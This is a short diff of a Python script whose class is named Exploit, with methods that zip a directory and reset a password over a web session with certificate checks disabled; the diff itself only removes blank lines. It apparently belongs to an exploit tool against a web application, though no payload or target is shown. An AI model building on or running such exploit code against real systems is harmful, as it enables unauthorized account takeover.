@@ -33,7 +33,6 @@ signal.signal(signal.SIGINT, def_handler)
 class Exploit:
 
     def __init__(self, main_url, password, filename):
-
         self.url = main_url
 	self.password = password
 	self.filename = filename
@@ -45,7 +44,6 @@ class Exploit:
 	shutil.make_archive(self.filename, 'zip', cwd+'/'+self.filename)
 
     def reset_password(self):
-
 	s = requests.session()
 	s.verify = False
 	urllib3.disable_warnings()
